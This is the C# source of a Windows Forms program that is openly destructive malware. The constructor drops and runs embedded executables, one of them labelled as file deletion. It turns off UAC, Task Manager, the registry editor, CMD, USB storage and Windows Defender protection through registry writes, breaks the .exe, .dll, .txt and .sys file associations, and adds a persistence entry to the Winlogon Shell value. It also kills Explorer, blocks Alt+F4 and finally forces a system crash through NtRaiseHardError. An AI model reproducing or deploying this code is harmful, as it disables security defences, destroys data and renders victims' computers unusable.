using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Media;

namespace Orocess
{
    public partial class deep : Form
    {
        [DllImport("user32.dll")]
        private static extern bool SetCursorPos(int x, int y);

        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(int ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        public deep()
        {
            InitializeComponent();
            //404
            string file = Path.GetTempFileName().Replace(".tmp", ".exe");
            byte[] bin = Properties.Resources.no;
            using (FileStream fs = new FileStream(file, FileMode.Create))
                fs.Write(bin, 0, bin.Length);
            Process p = Process.Start(file);
            p.WaitForExit();
            File.Delete(file);

            //Start up
            string file6 = Path.GetTempFileName().Replace(".tmp", ".exe");
            byte[] bin6 = Properties.Resources.No_place_to_stay;
            using (FileStream fs6 = new FileStream(file6, FileMode.Create))
                fs6.Write(bin6, 0, bin6.Length);

            //cursor.cur
            string originalFilePath = Path.GetTempFileName();
            string windowsFolderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "cursor.cur");
            byte[] bin1 = Properties.Resources.cursor;
            using (FileStream fs = new FileStream(windowsFolderPath, FileMode.Create))
                fs.Write(bin1, 0, bin1.Length);

            //Regedit Edit
            RegistryKey wallpaper = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop");
            wallpaper.SetValue("NoChangingWallPaper", 1);
            wallpaper.Dispose();

            Microsoft.Win32.RegistryKey uac = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system");
            uac.SetValue("ConsentPromptBehaviorAdmin", 0);
            uac.Dispose();

            Microsoft.Win32.RegistryKey taskmgr = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            taskmgr.SetValue("DisableTaskMgr", 1);
            taskmgr.Dispose();
            RegistryKey taskmgr1 = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            taskmgr1.SetValue("DisableTaskMgr", 1);
            taskmgr1.Dispose();

            RegistryKey registry = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            registry.SetValue("DisableRegistryTools", 1);
            registry.Dispose();
            RegistryKey registry1 = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            registry1.SetValue("DisableRegistryTools", 1);
            registry1.Dispose();

            RegistryKey winkey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            winkey.SetValue("NoWinKeys", 1);
            winkey.Dispose();

            RegistryKey usb = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Services\usbstor");
            usb.SetValue("Start", 4);
            usb.Dispose();

            RegistryKey defender = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender");
            defender.SetValue("DisableAntiSpyware", 1);
            defender.Dispose();

            RegistryKey key1 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender");
            key1.SetValue("DisableAntiSpyware", 1);
            key1.Dispose();
            RegistryKey key1n1 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender");
            key1n1.SetValue("DisableRoutinelyTakingAction", 1);
            key1n1.Dispose();

            RegistryKey key2 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            key2.SetValue("WindowsDefenderMAJ", 1);
            key2.Dispose();
            RegistryKey key2n1 = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            key2n1.SetValue("WindowsDefenderMAJ", 1);
            key2n1.Dispose();

            RegistryKey key3 = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
            key3.SetValue("Arrow", @"C:\Windows\cursor.cur");
            key3.SetValue("AppStarting", @"C:\Windows\cursor.cur");
            key3.SetValue("Hand", @"C:\Windows\cursor.cur");
            key3.Dispose();

            RegistryKey key4 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            key4.SetValue("EnableLUA", 0);
            key4.Dispose();

            RegistryKey key5 = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            key5.SetValue("NoControlPanel", 1);
            key5.Dispose();

            RegistryKey key9 = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
            key9.SetValue("SwapMouseButtons", "1");
            key9.Dispose();

            RegistryKey noran = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            noran.SetValue("NoRun", 1);
            noran.Dispose();
            RegistryKey noran1 = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            noran1.SetValue("NoRun", 1);
            noran1.Dispose();

            RegistryKey reg_logon = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg_logon.SetValue("shutdownwithoutlogon", 0, RegistryValueKind.DWord);
            reg_logon.Dispose();

            RegistryKey reg_winlogon = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            reg_winlogon.SetValue("AutoRestartShell", 0, RegistryValueKind.DWord);
            reg_winlogon.Dispose();

            RegistryKey key6 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
            key6.SetValue("UseDefaultTile", 1);
            key6.Dispose();

            RegistryKey key7 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            key7.SetValue("FilterAdministratorToken", 1);
            key7.Dispose();

            RegistryKey key8 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection");
            key8.SetValue("DisableRealtimeMonitoring", 1);
            key8.Dispose();

            RegistryKey usb1 = Registry.CurrentUser.CreateSubKey(@"SYSTEM\CurrentControlSet\Services");
            usb1.SetValue("USBSTOR", 4);
            usb1.Dispose();
            RegistryKey usb2 = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Services");
            usb2.SetValue("USBSTOR", 4);
            usb2.Dispose();

            RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Services\usbstor");
            key.SetValue("Start", 4);
            key.Dispose();

            RegistryKey wsh = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows Script Host\Settings");
            wsh.SetValue("Enabled", 0);
            wsh.Dispose();
            RegistryKey wsh1 = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows Script Host\Settings");
            wsh1.SetValue("Enabled", 0);
            wsh1.Dispose();

            RegistryKey cmd = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows");
            cmd.SetValue("DisableCMD", 2);
            cmd.Dispose();
            RegistryKey cmd1 = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System");
            cmd1.SetValue("DisableCMD", 2);
            cmd1.Dispose();
            RegistryKey cmd2 = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\");
            cmd2.SetValue("DisableCMD", 2);
            cmd2.Dispose();
            RegistryKey cmd_m = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows");
            cmd_m.SetValue("DisableCMD", 2);
            cmd_m.Dispose();
            RegistryKey cmd_m1 = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\System");
            cmd_m1.SetValue("DisableCMD", 2);
            cmd_m1.Dispose();
            RegistryKey cmd_m2 = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\");
            cmd_m2.SetValue("DisableCMD", 2);
            cmd_m2.Dispose();

            //file deletion
            string file2 = Path.GetTempFileName().Replace(".tmp", ".exe");
            byte[] bin2 = Properties.Resources.del;
            using (FileStream fs = new FileStream(file2, FileMode.Create))
                fs.Write(bin2, 0, bin2.Length);
            Process p2 = Process.Start(file2);
            p2.WaitForExit();
            File.Delete(file2);

            Microsoft.Win32.RegistryKey exe = Microsoft.Win32.Registry.ClassesRoot.CreateSubKey("exefile\\shell\\open\\command");
            exe.SetValue("", "1", Microsoft.Win32.RegistryValueKind.String);
            exe.Dispose();
            Microsoft.Win32.RegistryKey exe1 = Microsoft.Win32.Registry.ClassesRoot.CreateSubKey("exefile\\shell\\runas\\command");
            exe1.SetValue("", "1", Microsoft.Win32.RegistryValueKind.String);
            exe1.Dispose();
            Microsoft.Win32.RegistryKey exes = Microsoft.Win32.Registry.ClassesRoot.CreateSubKey(".exe");
            exes.SetValue("", "1", Microsoft.Win32.RegistryValueKind.String);
            exes.Dispose();

            Microsoft.Win32.RegistryKey syss = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Classes\.sys");
            syss.SetValue("", "1", Microsoft.Win32.RegistryValueKind.String);
            syss.Dispose();

            Microsoft.Win32.RegistryKey txt = Microsoft.Win32.Registry.ClassesRoot.CreateSubKey("txtfilelegacy\\shell\\printto\\command");
            txt.SetValue("", "1", Microsoft.Win32.RegistryValueKind.String);
            txt.Dispose();
            Microsoft.Win32.RegistryKey txts = Microsoft.Win32.Registry.ClassesRoot.CreateSubKey("Classes\\.txt");
            txts.SetValue("", "1", Microsoft.Win32.RegistryValueKind.String);
            txts.Dispose();

            Microsoft.Win32.RegistryKey dlls = Microsoft.Win32.Registry.ClassesRoot.CreateSubKey("Classes\\.dll");
            dlls.SetValue("", "1", Microsoft.Win32.RegistryValueKind.String);
            dlls.Dispose();

            Microsoft.Win32.RegistryKey startup_virus = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");
            startup_virus.SetValue("Shell", @"explorer.exe, ""C:\Windows\No_place_to_stay.exe""");
            startup_virus.Dispose();

            System.Diagnostics.Process[] ps =
    System.Diagnostics.Process.GetProcessesByName("explorer.exe");
            foreach (System.Diagnostics.Process pass in ps)
            {
                pass.Kill();
            }

            SoundPlayer player = new SoundPlayer(Properties.Resources.w);
            player.Load();
            player.PlayLooping();

            img1.Interval = 3000; //コマ
            img1.Enabled = true;
        }

        protected override void WndProc(ref Message m)
        {
            const int WM_SYSKEYDOWN = 0x0104;
            const int VK_F4 = 0x73;

            // ウィンドウを閉じない
            if (m.Msg == WM_SYSKEYDOWN && m.WParam.ToInt32() == VK_F4)
            {
                // ALT+F4に対する処理を行わない
                m.Result = IntPtr.Zero;
            }
            else
            {
                base.WndProc(ref m);
            }
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {

        }

        private void deep_Load_1(object sender, EventArgs e)
        {
            //フォームを画面の中央に配置
            this.SetBounds((Screen.PrimaryScreen.Bounds.Width - this.Width) / 2,
                (Screen.PrimaryScreen.Bounds.Height - this.Height) / 2, this.Width,
                this.Height);
        }

        private void img1_Tick(object sender, EventArgs e)
        {
            pictureBox2.Image = Properties.Resources.img1;

            img1.Enabled = false;

            img2.Interval = 3000; //コマ
            img2.Enabled = true;
        }

        private void img2_Tick(object sender, EventArgs e)
        {
            pictureBox2.Image = Properties.Resources.img2;

            img2.Enabled = false;

            img3.Interval = 3000; //コマ
            img3.Enabled = true;
        }

        private void img3_Tick(object sender, EventArgs e)
        {
            pictureBox2.Image = Properties.Resources.img3;

            img3.Enabled = false;

            img4.Interval = 3000; //コマ
            img4.Enabled = true;
        }

        private void img4_Tick(object sender, EventArgs e)
        {
            pictureBox2.Image = Properties.Resources.img4;

            img4.Enabled = false;

            img5.Interval = 3000; //コマ
            img5.Enabled = true;
        }

        private void img5_Tick(object sender, EventArgs e)
        {
            pictureBox2.Image = Properties.Resources.pii1;

            msgbox randam = new msgbox();
            randam.Show();

            img5.Enabled = false;

            var i = 0xC0000022;
            bool t1;
            uint t2;
            RtlAdjustPrivilege(19, true, false, out t1);
            NtRaiseHardError((int)i, 0, 0, IntPtr.Zero, 6, out t2);
        }

        private void end_Tick(object sender, EventArgs e)
        {
        }
    }
}
